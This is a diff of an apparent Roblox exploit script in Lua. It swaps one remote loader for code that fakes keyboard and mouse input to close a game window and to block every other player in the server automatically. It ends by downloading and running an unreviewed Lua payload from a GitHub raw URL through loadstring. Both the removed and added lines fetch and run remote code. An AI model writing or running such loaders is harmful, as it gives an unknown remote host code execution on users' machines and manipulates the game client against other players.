@@ -1,1 +1,88 @@
-loadstring(game:HttpGet("https://api.genhubs.com/v2/loadscriptkaitun/?script_key=Vcfm0uDBvASKzIfoexHgsMXYLvdEi3Vz", true))()
+    task.spawn(function()
+        pcall(function()
+            local Players = game:GetService("Players")
+            local StarterGui = game:GetService("StarterGui")
+            local CoreGui = game:GetService("CoreGui")
+            local LocalPlayer = Players.LocalPlayer
+            
+            local function IsBlocked(userId)
+                return table.find(StarterGui:GetCore("GetBlockedUserIds"), userId)
+            end
+            
+            local interact = function(path)
+                game:GetService("GuiService").SelectedObject = path
+                task.wait()
+                if game:GetService("GuiService").SelectedObject == path then
+                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+                    game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+                    task.wait()
+                end
+                game:GetService("GuiService").SelectedObject = nil
+                wait(1)
+            end
+            
+            local function ProcessBlock()
+                CoreGui = game:GetService("CoreGui")
+
+                pcall(function()
+                    interact(CoreGui.FoundationOverlay.SafeAreaFrame.BlockingModalScreen.BlockingModalContainerWrapper.BlockingModal.AlertModal.AlertContents.Footer.Buttons["3"])
+                end)
+                pcall(function()
+                    interact(CoreGui.FoundationOverlay.BlockingModalScreen.BlockingModalContainerWrapper.BlockingModal.AlertModal.AlertContents.Footer.Buttons["3"])
+                end)
+                pcall(function()
+                    interact(CoreGui.BlockingModalScreen.BlockingModalContainer.BlockingModalContainerWrapper.BlockingModal.AlertModal.AlertContents.Footer.Buttons["3"])
+                end)
+            end
+            
+            local interact_2 = function(path)
+                if typeof(path) ~= "Instance" then return end;
+                local centerX = path.AbsolutePosition.X + path.AbsoluteSize.X / 2
+                local centerY = path.AbsolutePosition.Y + path.AbsoluteSize.Y / 2 + 63
+                game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, true, path, 2)
+                wait(0.1)
+                game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, false, path, 2)
+                wait(0.3);
+            end
+
+            while true do 
+                task.wait(1)
+
+                pcall(function()
+                    -- CLOSE SPINNER COUSIN
+                    if game:GetService("Players").LocalPlayer.PlayerGui.SpinnerWindow.Enabled == true then
+                        interact_2(game:GetService("Players").LocalPlayer.PlayerGui.SpinnerWindow.AboveSpinner.Navigation.CloseButton)
+                        interact_2(game:GetService("Players").LocalPlayer.PlayerGui.SpinnerWindow.CloseButton)
+                    end
+                end)
+
+                pcall(function()
+                    for _, player in pairs(Players:GetPlayers()) do
+                        if player == LocalPlayer or IsBlocked(player.UserId) then continue end
+        
+                        local attemp = 0
+        
+                        repeat  
+                            StarterGui:SetCore("PromptBlockPlayer", player)
+
+                            CoreGui:WaitForChild("BlockingModalScreen", 5)
+
+                            if CoreGui:FindFirstChild("BlockingModalScreen") then
+                                pcall(ProcessBlock)
+                            elseif CoreGui:FindFirstChild("FoundationOverlay") then
+                                pcall(ProcessBlock)
+                            end
+
+                            attemp = attemp + 1
+        
+                            task.wait(1)
+                        until attemp >= 10 or IsBlocked(player.UserId) 
+                    end
+                end)
+            end
+        end) 
+    end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Genhubs/hee/refs/heads/main/layercustom.lua"))()    
+end)
